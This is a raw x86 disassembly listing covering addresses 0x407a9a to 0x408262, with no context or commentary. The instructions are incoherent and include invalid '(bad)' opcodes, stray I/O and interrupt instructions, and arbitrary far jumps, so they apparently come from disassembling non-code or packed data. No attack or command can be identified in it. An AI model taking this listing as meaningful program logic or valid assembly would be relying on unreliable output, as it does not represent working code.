  407a9a:	jg     0x407a22
  407a9c:	stc    
  407a9d:	jno    0x407b17
  407a9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407aa0:	mov    esp,0x2053c907
  407aa5:	lock and eax,0x8842e9ae
  407aab:	test   eax,0xa503a70
  407ab0:	lods   al,BYTE PTR ds:[esi]
  407ab1:	int    0xba
  407ab3:	ds push ebp
  407ab5:	jnp    0x407aea
  407ab7:	push   cs
  407ab8:	into   
  407ab9:	sti    
  407aba:	loop   0x407a6e
  407abc:	(bad)  
  407abd:	hlt    
  407abe:	nop
  407abf:	jne    0x407ac6
  407ac1:	jbe    0x407b37
  407ac3:	mov    es,ecx
  407ac5:	nop
  407ac6:	ja     0x407b12
  407ac8:	sub    bl,BYTE PTR [edx-0x14]
  407acb:	test   al,0x39
  407acd:	and    al,0xd6
  407acf:	mov    ch,0xe1
  407ad1:	mov    eax,0xc3e87037
  407ad6:	xor    BYTE PTR [ebp-0x7],cl
  407ad9:	std    
  407ada:	cmp    al,0x6b
  407adc:	idiv   BYTE PTR [esi-0x541ad1a1]
  407ae2:	hlt    
  407ae3:	sar    ecx,0xe4
  407ae6:	ds adc al,0x1f
  407ae9:	pop    edx
  407aea:	jmp    DWORD PTR [ecx-0x76684acf]
  407af0:	imul   esp,DWORD PTR [ebp+0x48fd6bb4],0x55
  407af7:	dec    ecx
  407af8:	mov    ecx,0x1675e62f
  407afd:	xchg   ebx,eax
  407afe:	sti    
  407aff:	mov    WORD PTR [edx+0x2b1c046a],ss
  407b05:	xor    al,0x8d
  407b07:	mov    DWORD PTR [edx],esp
  407b09:	stos   BYTE PTR es:[edi],al
  407b0a:	hlt    
  407b0b:	xchg   ebx,eax
  407b0c:	cmp    DWORD PTR [ebp+0x6c],ecx
  407b0f:	mov    edx,0xb9f7f1cd
  407b14:	xor    DWORD PTR [edx+0x4f],eax
  407b17:	add    al,0x12
  407b19:	cmp    ebp,DWORD PTR [edi+eiz*2]
  407b1c:	push   ss
  407b1d:	repnz pop ebx
  407b1f:	add    dh,BYTE PTR [ebx+0x70addcd9]
  407b25:	das    
  407b26:	neg    DWORD PTR [esi+0x5318fe4d]
  407b2c:	pop    ecx
  407b2d:	and    dh,BYTE PTR [eax+eax*8]
  407b30:	ds pop ebx
  407b32:	lods   eax,DWORD PTR ds:[esi]
  407b33:	push   cs
  407b34:	pop    es
  407b35:	sti    
  407b36:	test   BYTE PTR [ecx+0x16dd41b],0xb5
  407b3d:	fist   WORD PTR [eax+0x5bcfdd1e]
  407b43:	fbstp  TBYTE PTR [eax*8-0x40e97992]
  407b4a:	out    0xc1,al
  407b4c:	(bad)  
  407b4d:	icebp  
  407b4e:	mov    ds:0xd3c1b50d,al
  407b53:	push   esi
  407b54:	scas   eax,DWORD PTR es:[edi]
  407b55:	mov    ecx,0x4ecf8008
  407b5a:	mov    bl,0x1e
  407b5c:	stc    
  407b5d:	push   esi
  407b5e:	xchg   edx,eax
  407b5f:	jl     0x407bcd
  407b61:	sub    ah,BYTE PTR [esi-0x7fb43eac]
  407b67:	push   ss
  407b68:	adc    BYTE PTR [esi+0x34],cl
  407b6b:	mul    DWORD PTR [ebx-0x49]
  407b6e:	test   DWORD PTR [edx+0x5d],esp
  407b71:	add    eax,0x180b5bb3
  407b76:	xchg   DWORD PTR [ebp+0x43db93d7],ebp
  407b7c:	cmp    dl,BYTE PTR [eax+0x532ead5]
  407b82:	pushf  
  407b83:	xor    BYTE PTR [esi],cl
  407b85:	jmp    0x1b6f205e
  407b8a:	push   edx
  407b8b:	adc    eax,0x1b18b54d
  407b90:	cld    
  407b91:	pop    ebx
  407b92:	xchg   BYTE PTR [ebx-0x5f],dh
  407b95:	xchg   DWORD PTR [edx+0x56],ecx
  407b98:	aam    0x6a
  407b9a:	or     dl,bl
  407b9c:	sub    dl,BYTE PTR [ebx]
  407b9e:	or     DWORD PTR [edi-0x46],0x6b41af90
  407ba5:	(bad)  
  407ba6:	or     al,0x33
  407ba8:	arpl   WORD PTR [eax-0x5a],si
  407bab:	push   ebx
  407bac:	pushf  
  407bad:	add    DWORD PTR [ebx],esi
  407baf:	test   DWORD PTR [edi],ebp
  407bb1:	sbb    dl,BYTE PTR [ebp+0x3a6afae4]
  407bb7:	mov    ds:0x9ff5b5cd,al
  407bbc:	push   ecx
  407bbd:	clc    
  407bbe:	sbb    ch,BYTE PTR [esp+eax*2]
  407bc1:	cmc    
  407bc2:	cmc    
  407bc3:	push   ebx
  407bc4:	cmp    DWORD PTR [ecx-0x3e],esi
  407bc7:	jns    0x407bf1
  407bc9:	nop
  407bca:	addr16 clc 
  407bcc:	push   eax
  407bcd:	cld    
  407bce:	ret    
  407bcf:	xchg   ebp,eax
  407bd0:	fs loope 0x407b62
  407bd3:	fld    TBYTE PTR [esi]
  407bd5:	leave  
  407bd6:	js     0x407b9b
  407bd8:	mov    esp,0x77281ba5
  407bdd:	imul   ebx
  407bdf:	test   eax,0x76d7d823
  407be4:	and    BYTE PTR [ecx-0x187fd4d7],al
  407bea:	mov    ds:0x9698eaaa,al
  407bef:	cmp    DWORD PTR [esp+ebx*8],eax
  407bf2:	pushf  
  407bf3:	ja     0x407b9e
  407bf5:	mov    ebp,0x9931c0d5
  407bfa:	push   ss
  407bfb:	je     0x407bdc
  407bfd:	scas   al,BYTE PTR es:[edi]
  407bfe:	push   ebp
  407bff:	sub    bl,BYTE PTR [edi+0x29]
  407c02:	inc    eax
  407c03:	retf   0x41a5
  407c06:	imul   ebx,DWORD PTR [ebx-0x50c8bc55],0xd914b0bc
  407c10:	imul   BYTE PTR [ecx-0x51]
  407c13:	jmp    0x46e3:0xbe9d88bc
  407c1a:	add    eax,0x5a2eaf59
  407c1f:	pmulhw mm2,mm5
  407c22:	int3   
  407c23:	rol    BYTE PTR [ebp+0x44fa347c],1
  407c29:	sub    ebx,esp
  407c2b:	jmp    0x432333d1
  407c30:	add    BYTE PTR [edx-0x17],cl
  407c33:	dec    edx
  407c34:	and    eax,DWORD PTR [eax]
  407c36:	add    BYTE PTR [eax-0x5d10c7b2],dh
  407c3c:	mov    esi,DWORD PTR [ebx+0x33]
  407c3f:	(bad)  
  407c40:	sbb    BYTE PTR ds:0x776d36e6,cl
  407c46:	cmp    BYTE PTR [esi],al
  407c48:	cmp    bh,BYTE PTR [esp+edi*2+0x4e]
  407c4c:	pop    edi
  407c4d:	jl     0x407ccb
  407c4f:	xchg   ebp,eax
  407c50:	ror    DWORD PTR [ebx-0x2d],cl
  407c53:	sbb    ebp,ebx
  407c55:	mov    WORD PTR [ebp+0x47b70742],gs
  407c5b:	(bad)  
  407c5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c5d:	fnstcw WORD PTR [edi-0x50d03de5]
  407c63:	fdiv   DWORD PTR [ecx]
  407c65:	push   cs
  407c66:	(bad)  
  407c68:	jb     0x407c38
  407c6a:	mov    ch,0x60
  407c6c:	out    dx,al
  407c6d:	xchg   BYTE PTR [edi+0x22],ah
  407c70:	sub    BYTE PTR [edx+0x54d68d5a],0xce
  407c77:	outs   dx,DWORD PTR ds:[esi]
  407c78:	push   edi
  407c79:	sti    
  407c7a:	cli    
  407c7b:	sbb    eax,0xe4c3ac4e
  407c80:	sbb    BYTE PTR [ebx],0x43
  407c83:	sbb    al,0x8e
  407c85:	retf   
  407c86:	cdq    
  407c87:	pop    ebp
  407c88:	push   es
  407c89:	inc    ebp
  407c8a:	jmp    0x407c7b
  407c8c:	jmp    0x6675:0x72c4637e
  407c93:	jno    0x407c17
  407c95:	addr16 jg 0x407c7e
  407c98:	cmp    eax,0x687a213
  407c9d:	in     al,dx
  407c9e:	adc    DWORD PTR [edx-0x2cd3f49f],eax
  407ca4:	pop    ebp
  407ca5:	(bad)  
  407ca6:	mov    ebx,0xf3323b09
  407cab:	shr    eax,cl
  407cad:	cmp    ch,BYTE PTR [esi]
  407caf:	sub    al,0xd0
  407cb1:	ret    
  407cb2:	lahf   
  407cb3:	dec    eax
  407cb4:	sbb    al,0x44
  407cb6:	xchg   ecx,eax
  407cb7:	mov    esp,0x1e12efd1
  407cbc:	xlat   BYTE PTR ds:[ebx]
  407cbd:	inc    ebx
  407cbe:	or     eax,0x84f9e8db
  407cc3:	mov    cl,0x90
  407cc5:	mov    eax,ds:0xb2ffb86e
  407cca:	dec    edx
  407ccb:	xor    bl,BYTE PTR [ebx-0x16d7a5de]
  407cd1:	bound  ecx,QWORD PTR [eax+0x3c]
  407cd4:	sbb    DWORD PTR [edi-0x6c5ca992],0xffffffc5
  407cdb:	mov    ds:0x6083aac0,al
  407ce0:	cmp    bh,dl
  407ce2:	inc    edi
  407ce3:	cmp    ecx,DWORD PTR [ebp+0x66]
  407ce6:	addr16 jno 0x407d1c
  407ce9:	sbb    al,0x37
  407ceb:	xchg   esp,eax
  407cec:	pop    ecx
  407ced:	lea    esi,[esi]
  407cef:	mov    ecx,0x1984b9f0
  407cf4:	mov    ebx,0x8ddc5dac
  407cf9:	cmp    DWORD PTR [ebp+edx*8+0x22a6905f],ecx
  407d00:	fwait
  407d01:	xchg   ebx,eax
  407d02:	neg    BYTE PTR fs:[esi-0x274f66d7]
  407d09:	addr16 loope 0x407ce8
  407d0c:	int    0x4b
  407d0e:	push   edx
  407d0f:	mov    ecx,0x2e984b46
  407d14:	sbb    ecx,DWORD PTR [ebx-0x1b]
  407d17:	or     al,0x4d
  407d19:	jmp    0xf7befc05
  407d1e:	jmp    0x407d35
  407d20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d21:	(bad)  
  407d22:	je     0x407cdf
  407d24:	aaa    
  407d25:	xchg   DWORD PTR [ebx],eax
  407d27:	mov    bl,0x80
  407d29:	outs   dx,BYTE PTR ds:[esi]
  407d2a:	out    0xd9,al
  407d2c:	xchg   BYTE PTR [ebp+ecx*4-0x48],dh
  407d30:	popa   
  407d31:	and    al,al
  407d33:	mov    ah,0xb6
  407d35:	mov    esi,DWORD PTR [edx+0x46]
  407d38:	xor    dl,BYTE PTR [edx+0x46]
  407d3b:	es inc ebx
  407d3d:	scas   al,BYTE PTR es:[edi]
  407d3e:	sub    bl,BYTE PTR [edi-0x30370424]
  407d44:	and    bl,bl
  407d46:	mov    al,es:0xfc2ce42e
  407d4c:	out    dx,al
  407d4d:	test   eax,0xd26072f0
  407d52:	clc    
  407d53:	or     BYTE PTR [edi],bl
  407d55:	pop    edx
  407d56:	out    dx,eax
  407d57:	pop    ebx
  407d58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d59:	mov    dl,0x9d
  407d5b:	(bad)  
  407d5c:	arpl   WORD PTR [edi+0x2ceed443],sp
  407d62:	jecxz  0x407d48
  407d64:	pop    edx
  407d65:	ss ja  0x407d5e
  407d68:	xchg   DWORD PTR [ebp-0x36715412],esi
  407d6e:	(bad)  
  407d6f:	dec    esp
  407d70:	pop    edi
  407d71:	and    bh,BYTE PTR [esi+0x1e]
  407d74:	test   BYTE PTR ds:0x5253f636,ah
  407d7a:	sahf   
  407d7b:	mov    bl,0x45
  407d7d:	fld    QWORD PTR [edx+0x73a943d1]
  407d83:	dec    esp
  407d84:	fcom   QWORD PTR ds:0xd4b934fc
  407d8a:	push   edx
  407d8b:	(bad)  
  407d8d:	push   es
  407d8e:	jns    0x407dfc
  407d90:	repnz xlat BYTE PTR ds:[ebx]
  407d92:	out    dx,al
  407d93:	rcl    ecx,1
  407d95:	inc    edx
  407d96:	inc    eax
  407d97:	sbb    DWORD PTR [esi-0x7e],edx
  407d9a:	in     eax,dx
  407d9b:	add    eax,0x9eccabe7
  407da0:	sub    DWORD PTR [edx+0x12],0xc5b3b7b0
  407da7:	je     0x407d76
  407da9:	fidiv  DWORD PTR [eax+ebp*2+0x74]
  407dad:	jecxz  0x407d35
  407daf:	push   esp
  407db0:	mov    ds:0xef2d7bc2,al
  407db5:	and    ebx,DWORD PTR [esi]
  407db7:	cmp    eax,0x5d18c99f
  407dbc:	test   DWORD PTR [ebx],0x41eb4671
  407dc2:	out    0xd5,eax
  407dc4:	adc    edi,DWORD PTR [ecx+0x30]
  407dc7:	mov    esp,0xd81a4309
  407dcc:	xor    BYTE PTR [edi-0x7655d219],dh
  407dd2:	pop    ebx
  407dd3:	stos   BYTE PTR es:[edi],al
  407dd4:	xlat   BYTE PTR ds:[ebx]
  407dd5:	cmc    
  407dd6:	(bad)  
  407dd7:	test   eax,0xceffb36f
  407ddc:	sub    eax,0xcb945f50
  407de1:	pop    ecx
  407de2:	xchg   ah,al
  407de4:	out    dx,eax
  407de5:	cmp    al,0x7a
  407de7:	adc    eax,0xe80513ec
  407dec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ded:	sar    DWORD PTR [ecx+0x601404d1],1
  407df3:	stc    
  407df4:	push   esp
  407df5:	jl     0x407e2b
  407df7:	out    0x53,eax
  407df9:	dec    esi
  407dfa:	pop    eax
  407dfb:	mov    ecx,0x59c9872a
  407e00:	adc    BYTE PTR [ecx-0x4],al
  407e03:	mov    ah,0x5d
  407e05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e06:	inc    esi
  407e07:	jb     0x407e70
  407e09:	(bad)  
  407e0b:	sti    
  407e0c:	adc    ecx,DWORD PTR [edx+0x2e24bd54]
  407e12:	aaa    
  407e13:	imul   eax,DWORD PTR [ecx+0xa183ad7],0x6d
  407e1a:	mov    bl,0xfb
  407e1c:	call   0x166a:0xb96ddbc3
  407e23:	jp     0x407e8a
  407e25:	shl    edi,cl
  407e27:	inc    ebx
  407e28:	sub    DWORD PTR [edi],esi
  407e2a:	(bad)  
  407e2b:	xor    BYTE PTR fs:[eax-0x1b],bh
  407e2f:	pop    ss
  407e30:	arpl   bx,ax
  407e32:	or     al,0x7e
  407e34:	inc    ebx
  407e35:	add    ebp,ebp
  407e37:	or     al,0xa
  407e39:	sbb    ebp,DWORD PTR [edi+0x100282fc]
  407e3f:	push   ss
  407e40:	pop    ecx
  407e41:	cs pop edi
  407e43:	sub    ebp,DWORD PTR ss:[edx-0x239eacc7]
  407e4a:	enter  0x3d87,0x62
  407e4e:	fstp   DWORD PTR [edx]
  407e50:	fidiv  DWORD PTR [eax]
  407e52:	xor    eax,DWORD PTR [edi-0x1c411856]
  407e58:	xor    ah,BYTE PTR [eax-0x34]
  407e5b:	imul   edi,DWORD PTR [eax-0x6a],0x850fcf89
  407e62:	add    al,ah
  407e64:	test   al,0xde
  407e66:	test   BYTE PTR [eax],bl
  407e68:	adc    eax,0xac5a6579
  407e6d:	test   BYTE PTR [eax+ecx*1],ah
  407e70:	pop    es
  407e71:	add    DWORD PTR [eax-0x4714b4f6],0x8a9b2f0e
  407e7b:	repz test DWORD PTR [edi],esi
  407e7e:	fdivr  st,st(1)
  407e80:	icebp  
  407e81:	add    bl,ah
  407e83:	xor    edx,edx
  407e85:	push   eax
  407e86:	in     al,0x99
  407e88:	lods   al,BYTE PTR ds:[esi]
  407e89:	shl    ch,0xcc
  407e8c:	lds    bx,DWORD PTR [edi-0x4f]
  407e90:	sbb    BYTE PTR [ebp+0x77fc29ac],dl
  407e96:	xchg   DWORD PTR [ebx-0x324e1b67],esi
  407e9c:	sbb    DWORD PTR [esi],0xffffffa5
  407e9f:	hlt    
  407ea0:	call   0xa0e5d363
  407ea5:	iret   
  407ea6:	gs jnp 0x407e31
  407ea9:	jp     0x407e2f
  407eab:	std    
  407eac:	stos   BYTE PTR es:[edi],al
  407ead:	cwde   
  407eae:	push   ds
  407eaf:	push   ds
  407eb0:	outs   dx,DWORD PTR ds:[esi]
  407eb1:	pop    ecx
  407eb2:	sub    eax,0x7271d194
  407eb7:	inc    eax
  407eb8:	inc    eax
  407eb9:	push   ecx
  407eba:	and    ecx,ecx
  407ebc:	pop    DWORD PTR [edi+0x51298068]
  407ec2:	pop    ecx
  407ec3:	jp     0x407f30
  407ec5:	pop    ebp
  407ec6:	loop   0x407e66
  407ec8:	mov    eax,0xbec23292
  407ecd:	into   
  407ece:	out    0xc8,eax
  407ed0:	ins    DWORD PTR es:[edi],dx
  407ed1:	xor    bh,BYTE PTR [ecx+0x64d82937]
  407ed7:	inc    edx
  407ed8:	icebp  
  407ed9:	outs   dx,DWORD PTR ds:[esi]
  407eda:	iret   
  407edb:	pop    ebp
  407edc:	(bad)  
  407edd:	jbe    0x407e77
  407edf:	popf   
  407ee0:	push   edi
  407ee1:	add    eax,0x1dfdf517
  407ee6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ee7:	(bad)  
  407ee8:	mov    eax,DWORD PTR [ebx+eiz*8+0x39]
  407eec:	cwde   
  407eed:	adc    DWORD PTR [ebx+esi*1-0x355b43b9],ebp
  407ef4:	nop
  407ef5:	mov    esi,0x5eb0f2ac
  407efa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407efb:	mov    bh,0xf9
  407efd:	push   cs
  407efe:	or     al,BYTE PTR [ebx+ecx*2-0x322d2025]
  407f05:	xchg   DWORD PTR [edx+0x5a],edx
  407f08:	clc    
  407f09:	int    0x46
  407f0b:	xor    al,0x75
  407f0d:	push   ecx
  407f0e:	out    dx,al
  407f0f:	adc    BYTE PTR [ebx-0x2911515],bl
  407f15:	cdq    
  407f16:	push   eax
  407f17:	jecxz  0x407f48
  407f19:	and    eax,0x45955189
  407f1e:	in     al,0x22
  407f20:	lds    ecx,FWORD PTR [esi-0x53]
  407f23:	aas    
  407f24:	dec    eax
  407f25:	je     0x407f20
  407f27:	repnz or DWORD PTR ds:0x880c73a4,ebx
  407f2e:	sbb    edi,0x406d61f1
  407f34:	cmc    
  407f35:	cld    
  407f36:	test   al,0xd7
  407f38:	rcr    BYTE PTR [eax+0x122d0bd8],0x46
  407f3f:	int    0x7b
  407f41:	jp     0x407f93
  407f43:	sub    DWORD PTR [edi],0xffffffc8
  407f46:	sbb    ch,bl
  407f48:	mov    esi,0x96f9b00d
  407f4d:	pop    ecx
  407f4e:	inc    esi
  407f4f:	test   al,0xe4
  407f51:	dec    ebx
  407f52:	xor    DWORD PTR [esi-0x65e8f589],ecx
  407f58:	ins    BYTE PTR es:[edi],dx
  407f59:	addr16 ss clc 
  407f5c:	jno    0x407fc1
  407f5e:	cld    
  407f5f:	pusha  
  407f60:	ja     0x407fd4
  407f62:	popf   
  407f63:	or     ebp,esp
  407f65:	cli    
  407f66:	jge    0x407f8c
  407f68:	cwde   
  407f69:	push   ebx
  407f6a:	or     esp,DWORD PTR [ebx+0x14]
  407f6d:	cmp    bh,al
  407f6f:	ds jl  0x407f57
  407f72:	sub    ebp,DWORD PTR [ebx+0x27c7bb7]
  407f78:	gs jnp 0x407fbc
  407f7b:	xchg   edx,eax
  407f7c:	cs retf 
  407f7e:	inc    esi
  407f7f:	aad    0xfe
  407f81:	dec    eax
  407f82:	imul   ecx,DWORD PTR [ecx+0x3c],0xfffffff9
  407f86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f87:	ja     0x407fc2
  407f89:	test   bh,dh
  407f8b:	ds pop ss
  407f8d:	jmp    0xd92d11f8
  407f92:	push   ecx
  407f93:	stos   BYTE PTR es:[edi],al
  407f94:	and    al,0x4c
  407f96:	mov    ecx,0xbf35d815
  407f9b:	dec    ebp
  407f9c:	cmp    BYTE PTR [edx],cl
  407f9e:	cdq    
  407f9f:	lods   eax,DWORD PTR ds:[esi]
  407fa0:	push   ecx
  407fa1:	xchg   edi,eax
  407fa2:	ret    
  407fa3:	int    0xe4
  407fa5:	dec    esp
  407fa6:	cld    
  407fa7:	jb     0x407fe3
  407fa9:	popf   
  407faa:	xchg   edi,eax
  407fab:	jno    0x407f49
  407fad:	mov    ecx,DWORD PTR [eax-0x49]
  407fb0:	and    ebx,edi
  407fb2:	xlat   BYTE PTR ds:[ebx]
  407fb3:	mov    cl,BYTE PTR [edx-0x6e90b3fd]
  407fb9:	mov    bh,0xb3
  407fbb:	fisub  WORD PTR [eax+0x410eb9cf]
  407fc1:	or     eax,0x9bc7cd01
  407fc6:	inc    edx
  407fc7:	add    al,0xd0
  407fc9:	retf   0x54dd
  407fcc:	cdq    
  407fcd:	jbe    0x407f5f
  407fcf:	sti    
  407fd0:	push   esi
  407fd1:	and    al,0x2e
  407fd3:	out    0xc6,al
  407fd5:	push   ebp
  407fd6:	pop    ebx
  407fd7:	arpl   WORD PTR [edi-0xd],bp
  407fda:	fimul  WORD PTR [ebp-0x8f7a2db]
  407fe0:	gs and edx,ecx
  407fe3:	cmp    al,0xfd
  407fe5:	dec    esi
  407fe6:	test   BYTE PTR [edi-0x2c5037b8],al
  407fec:	dec    edi
  407fed:	sub    al,0x4b
  407fef:	push   ecx
  407ff0:	sbb    dh,bh
  407ff2:	jb     0x407fee
  407ff4:	add    BYTE PTR [ecx],bh
  407ff6:	test   BYTE PTR [esi],ah
  407ff8:	cdq    
  407ff9:	jp     0x407f98
  407ffb:	(bad)  
  407ffd:	loope  0x407fb6
  407fff:	clc    
  408000:	fwait
  408001:	or     BYTE PTR [edi+0x1cfe287a],cl
  408007:	fisttp QWORD PTR [ecx+ebp*8-0x59]
  40800b:	int    0x3
  40800d:	js     0x407fa6
  40800f:	test   BYTE PTR [eax],dl
  408011:	jne    0x407fbf
  408013:	mov    ebp,0x83438812
  408018:	(bad)  
  408019:	dec    ebx
  40801a:	mov    dh,0x88
  40801c:	lea    eax,[ecx-0xd9bf218]
  408022:	gs inc esp
  408024:	ret    
  408025:	jnp    0x40808c
  408027:	cdq    
  408028:	ins    DWORD PTR es:[edi],dx
  408029:	stos   BYTE PTR es:[edi],al
  40802a:	or     dl,BYTE PTR [edx+0x5396f874]
  408030:	mov    al,0xc1
  408032:	jle    0x407ff0
  408034:	ret    
  408035:	adc    ah,ch
  408037:	pop    ds
  408038:	cmp    BYTE PTR [eax-0x33f18e4c],dl
  40803e:	pop    edx
  40803f:	fstp   DWORD PTR [edx-0x46]
  408042:	jecxz  0x40807b
  408044:	pop    esi
  408045:	(bad)  
  408047:	push   cs
  408048:	push   ecx
  408049:	mov    esi,0x96353769
  40804e:	dec    ecx
  40804f:	(bad)  
  408051:	repnz sub al,al
  408054:	pop    ss
  408055:	cdq    
  408056:	retf   
  408057:	add    al,0x83
  408059:	jecxz  0x4080ab
  40805b:	aam    0x57
  40805d:	scas   eax,DWORD PTR es:[edi]
  40805e:	fs fwait
  408060:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408061:	pop    es
  408062:	ror    bl,0x7e
  408065:	mov    al,ds:0x528ef001
  40806a:	sub    ah,BYTE PTR [ebx+0x1d3a9c24]
  408070:	add    eax,0xbb8dc430
  408075:	inc    esp
  408076:	dec    ebx
  408077:	cmp    ah,bh
  408079:	jge    0x40801c
  40807b:	stc    
  40807c:	adc    bl,BYTE PTR [ecx]
  40807e:	jns    0x408002
  408080:	stos   DWORD PTR es:[edi],eax
  408081:	rol    DWORD PTR [edi+0x7b896756],1
  408087:	lock pop eax
  408089:	sbb    eax,0xda392954
  40808e:	mov    ah,0xd
  408090:	adc    edx,ecx
  408092:	lahf   
  408093:	xor    edx,edx
  408095:	mov    ah,0xb
  408097:	push   0xa2f16c4
  40809c:	xor    esp,DWORD PTR [eax-0x2fb44fb4]
  4080a2:	aaa    
  4080a3:	sub    dh,BYTE PTR [ebx-0x715feec]
  4080a9:	adc    BYTE PTR [eax+ebp*2-0x7ca2da1c],ch
  4080b0:	pop    esp
  4080b1:	mov    eax,DWORD PTR [eax+0x61848d09]
  4080b7:	xor    esp,DWORD PTR [ebp-0x21]
  4080ba:	clc    
  4080bb:	dec    ebp
  4080bc:	stc    
  4080bd:	arpl   WORD PTR [ecx+esi*8-0x2d],ax
  4080c1:	or     DWORD PTR [ebp+0x77794818],esp
  4080c7:	icebp  
  4080c8:	sub    BYTE PTR [edx-0x6f],dl
  4080cb:	imul   BYTE PTR [ebx-0x3f]
  4080ce:	mov    ebx,0x52452e17
  4080d3:	fwait
  4080d4:	push   esp
  4080d5:	pop    es
  4080d6:	push   eax
  4080d7:	ret    
  4080d8:	and    eax,0xd7a0ec5c
  4080dd:	std    
  4080de:	(bad)  
  4080df:	ins    BYTE PTR es:[edi],dx
  4080e0:	(bad)  
  4080e1:	(bad)  
  4080e2:	mov    fs,WORD PTR [eax]
  4080e4:	jno    0x4080c2
  4080e6:	cmp    eax,0x5aa619a8
  4080eb:	xor    DWORD PTR [ecx*1-0x469b3295],esi
  4080f2:	push   edx
  4080f3:	jns    0x4080f7
  4080f5:	jo     0x40813c
  4080f7:	out    0xeb,al
  4080f9:	jmp    0x1e89:0x4974556d
  408100:	push   esi
  408101:	sahf   
  408102:	(bad)  
  408103:	mov    al,0x41
  408105:	mov    ebx,0x20c8a251
  40810a:	ret    
  40810b:	mov    ecx,fs
  40810d:	pop    es
  40810e:	arpl   WORD PTR [eax],di
  408110:	cld    
  408111:	or     BYTE PTR [edx+0x5bfd9120],al
  408117:	cmp    al,0x81
  408119:	xchg   ebp,eax
  40811a:	gs pop ebp
  40811c:	retf   0xa00c
  40811f:	jbe    0x408124
  408121:	mov    al,ds:0xbab14af4
  408126:	in     al,0x70
  408128:	mov    fs,WORD PTR [esi+0x34036c68]
  40812e:	dec    edx
  40812f:	xor    DWORD PTR [edx-0xa],edx
  408132:	popa   
  408133:	jg     0x40817b
  408135:	cwde   
  408136:	gs int3 
  408138:	icebp  
  408139:	arpl   WORD PTR [ebp-0x4246d449],cx
  40813f:	aad    0x5c
  408141:	retf   0x22de
  408144:	inc    eax
  408145:	add    edi,DWORD PTR [edi+0x7298d4e8]
  40814b:	pusha  
  40814c:	outs   dx,DWORD PTR ds:[esi]
  40814d:	sbb    DWORD PTR [edx-0x65],ebp
  408150:	xor    DWORD PTR [ebp-0x27e5b317],ebx
  408156:	jp     0x408103
  408158:	sub    al,0x9c
  40815a:	sar    BYTE PTR ds:0x354a7ae2,1
  408160:	cmp    ebp,DWORD PTR [esi]
  408162:	test   BYTE PTR [edx+0x18fe1b1],cl
  408168:	js     0x408101
  40816a:	shl    DWORD PTR [ebp-0x19],1
  40816d:	call   FWORD PTR [edi-0x51]
  408170:	cdq    
  408171:	icebp  
  408172:	pop    edx
  408173:	mov    ds:0x36329d74,eax
  408178:	push   esp
  408179:	gs push eax
  40817b:	mov    esp,0x544f71d8
  408180:	stos   DWORD PTR es:[edi],eax
  408181:	add    BYTE PTR [esi],cl
  408183:	inc    esp
  408184:	dec    edi
  408185:	lods   eax,DWORD PTR ds:[esi]
  408186:	fistp  QWORD PTR [ebx+edx*4-0x61]
  40818a:	jecxz  0x408138
  40818c:	lds    esp,FWORD PTR [eax+0x2034286f]
  408192:	or     DWORD PTR [esi],edx
  408194:	imul   eax,DWORD PTR [esi+ecx*2-0x242e8413],0xffffffe3
  40819c:	jb     0x4081dc
  40819e:	dec    edx
  40819f:	push   ebx
  4081a0:	nop
  4081a1:	inc    esi
  4081a2:	mov    ds:0xfa5c1a4a,eax
  4081a7:	jno    0x40814d
  4081a9:	daa    
  4081aa:	pop    edx
  4081ab:	loop   0x408191
  4081ad:	mov    bl,0xcf
  4081af:	lock ins BYTE PTR es:[edi],dx
  4081b1:	rol    BYTE PTR [ecx+0x1bc63a9e],0x5f
  4081b8:	sbb    DWORD PTR [ebp-0x4a],eax
  4081bb:	and    BYTE PTR [esp+ebx*4-0x389c3c2c],ah
  4081c2:	xchg   esi,eax
  4081c3:	inc    esi
  4081c4:	sub    ch,BYTE PTR [edx]
  4081c6:	mov    ds:0x52026af4,al
  4081cb:	retf   
  4081cc:	jbe    0x4081d1
  4081ce:	lock push es
  4081d0:	sar    DWORD PTR ds:0x3fe215f0,cl
  4081d6:	mov    eax,0x79c6fda7
  4081db:	ror    BYTE PTR [esi-0x2b],cl
  4081de:	fst    DWORD PTR ds:0x66614d45
  4081e4:	adc    eax,0xd677d477
  4081e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081ea:	outs   dx,BYTE PTR ds:[esi]
  4081eb:	and    DWORD PTR [ecx-0x775f2052],ebp
  4081f1:	arpl   WORD PTR [ecx+edx*4],ax
  4081f4:	and    BYTE PTR [esi+0x51209c4b],dh
  4081fa:	sahf   
  4081fb:	outs   dx,BYTE PTR ds:[esi]
  4081fc:	jle    0x40827c
  4081fe:	push   edi
  4081ff:	popf   
  408200:	xchg   esp,eax
  408201:	into   
  408202:	mov    ebx,0x893f4aef
  408207:	scas   al,BYTE PTR es:[edi]
  408208:	or     eax,0x620caf92
  40820d:	repnz xchg edx,eax
  40820f:	and    DWORD PTR [eax-0x656518c3],0xffffffca
  408216:	pushf  
  408217:	adc    eax,0x2fbd86b0
  40821c:	ins    BYTE PTR es:[edi],dx
  40821d:	jle    0x4081e0
  40821f:	stos   BYTE PTR es:[edi],al
  408220:	pushf  
  408221:	(bad)  
  408222:	into   
  408223:	or     ebx,DWORD PTR [ebx-0xd]
  408226:	and    eax,edx
  408228:	fsubp  st(2),st
  40822a:	ds retf 0x151c
  40822e:	sub    cl,ah
  408230:	sub    DWORD PTR [edi+0x668546d2],eax
  408236:	(bad)  
  408238:	adc    BYTE PTR [eax-0x52],0x60
  40823c:	mov    dl,0xa3
  40823e:	int3   
  40823f:	sbb    eax,0x3ba6c4de
  408244:	inc    edx
  408245:	inc    esp
  408246:	cmp    BYTE PTR [ebp-0x7b],bl
  408249:	int3   
  40824a:	retf   0x8342
  40824d:	inc    ebx
  40824e:	retf   
  40824f:	xor    esi,DWORD PTR [ebx-0x7]
  408252:	cld    
  408253:	push   edx
  408254:	js     0x4082c3
  408256:	adc    DWORD PTR [esi-0x4bf6f14d],ecx
  40825c:	add    BYTE PTR [ecx+0x1e],0xef
  408260:	xchg   ch,cl
  408262:	mov    al,BYTE PTR [edx]
